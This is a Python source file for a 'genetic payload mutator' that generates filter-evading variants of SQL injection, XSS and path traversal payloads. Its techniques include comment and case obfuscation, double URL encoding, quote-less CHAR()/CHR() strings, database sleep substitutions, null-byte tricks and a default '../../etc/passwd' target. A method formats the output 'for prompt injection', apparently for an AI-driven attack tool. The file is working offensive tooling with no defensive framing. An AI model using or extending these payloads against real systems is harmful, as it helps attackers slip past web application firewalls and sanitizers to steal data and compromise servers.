"""
Genetic Payload Mutator & Evasion Synthesizer
============================================
Inspired by Claude Opus Adaptive Payload Synthesis.

Generates sophisticated, mutated attack payloads to bypass WAFs and input sanitizers:
1. SQL Comment Injection (space-to-comment /**/)
2. Random Case Alternation (sElEcT, uNiOn)
3. Multi-tier & Double URL Encoding (%2527, %253C)
4. Quote-less String Construction (CHAR(114,111,111,116), HEX 0x...)
5. DB Dialect Function Substitutions (SLEEP ➔ BENCHMARK ➔ pg_sleep ➔ WAITFOR)
6. Null-byte & Delimiter Injection (%00, %0a, %09)
"""

from __future__ import annotations

import re
import urllib.parse
from typing import List


class PayloadMutator:
    """Synthesizes evasive payload mutations against defensive filters."""

    @classmethod
    def mutate_sqli(cls, base_payload: str, dialect: str = "mysql") -> List[str]:
        """
        Generate a spectrum of mutated SQL injection payloads from a base payload.
        """
        mutations: List[str] = []

        # 1. Comment Infiltration: replace spaces with /**/
        comment_payload = re.sub(r"\s+", "/**/", base_payload.strip())
        mutations.append(comment_payload)

        # 2. Case Alternation: alter uppercase/lowercase
        case_chars = []
        for i, c in enumerate(base_payload):
            case_chars.append(c.lower() if i % 2 == 0 else c.upper())
        mutations.append("".join(case_chars))

        # 3. Double URL Encoding
        double_encoded = urllib.parse.quote(urllib.parse.quote(base_payload))
        mutations.append(double_encoded)

        # 4. Dialect Function Substitutions for Time-based Payloads
        if "sleep" in base_payload.lower():
            if dialect == "mysql":
                # MySQL BENCHMARK substitution
                mutations.append(re.sub(r"sleep\s*\(\s*\d+\s*\)", "benchmark(5000000,md5(1))", base_payload, flags=re.I))
            elif dialect == "postgres":
                mutations.append(re.sub(r"sleep\s*\(\s*(\d+)\s*\)", r"pg_sleep(\1)", base_payload, flags=re.I))
            elif dialect == "mssql":
                mutations.append(re.sub(r"sleep\s*\(\s*\d+\s*\)", "waitfor delay '0:0:5'", base_payload, flags=re.I))

        # 5. Quote-less String Conversion (convert 'admin' to CHAR(...) or 0x...)
        def _quote_to_char(match: re.Match) -> str:
            val = match.group(1)
            char_codes = [str(ord(ch)) for ch in val]
            if dialect == "mysql":
                return f"CHAR({','.join(char_codes)})"
            elif dialect == "postgres":
                return " || ".join(f"CHR({c})" for c in char_codes)
            return match.group(0)

        quote_less = re.sub(r"['\"]([a-zA-Z0-9_]+)['\"]", _quote_to_char, base_payload)
        if quote_less != base_payload:
            mutations.append(quote_less)

        # 6. Combined Comment + Case
        mutations.append(re.sub(r"\s+", "/**/", "".join(case_chars)))

        return list(dict.fromkeys(mutations))  # Deduplicate preserving order

    @classmethod
    def mutate_xss(cls, base_payload: str) -> List[str]:
        """
        Generate evasive XSS payload mutations.
        """
        mutations: List[str] = []

        # 1. Mixed Case Tags
        mixed = re.sub(r"<script>", "<sCrIpt>", base_payload, flags=re.I)
        mixed = re.sub(r"</script>", "</sCrIpt>", mixed, flags=re.I)
        mutations.append(mixed)

        # 2. Event Handler without SCRIPT tag
        mutations.append("<img src=x onerror=alert(1)>")
        mutations.append("<svg onload=alert(1)>")

        # 3. Unicode and HTML Entity Variations
        mutations.append("<a href=\"javascript:alert(1)\">click</a>")

        # 4. Double URL Encoded
        mutations.append(urllib.parse.quote(urllib.parse.quote(base_payload)))

        return list(dict.fromkeys(mutations))

    @classmethod
    def mutate_path_traversal(cls, base_path: str = "../../etc/passwd") -> List[str]:
        """
        Generate evasive path traversal mutations.
        """
        return [
            base_path,
            base_path.replace("../", "..\\"),  # Windows slash variation
            base_path.replace("../", "%2e%2e%2f"),  # Single URL encoded
            base_path.replace("../", "%252e%252e%252f"),  # Double URL encoded
            base_path.replace("../", "..././"),  # Nested filter bypass
            f"{base_path}%00.png",  # Null-byte extension bypass
        ]

    @classmethod
    def format_mutations_block(cls, vuln_type: str, base_payload: str, dialect: str = "mysql") -> str:
        """Format mutations for prompt injection."""
        if vuln_type.lower() == "sqli":
            muts = cls.mutate_sqli(base_payload, dialect=dialect)
        elif vuln_type.lower() == "xss":
            muts = cls.mutate_xss(base_payload)
        else:
            muts = cls.mutate_path_traversal(base_payload)

        lines = [
            f"# 🧬 BỘ ĐỘT BIẾN GEN PAYLOAD (GENETIC PAYLOAD MUTATIONS - {vuln_type.upper()}):",
            f"• Payload gốc: `{base_payload}`",
            "• Các biến thể né tránh WAF đề xuất:",
        ]
        for i, m in enumerate(muts[:4], 1):
            lines.append(f"  {i}. `{m}`")
        return "\n".join(lines)
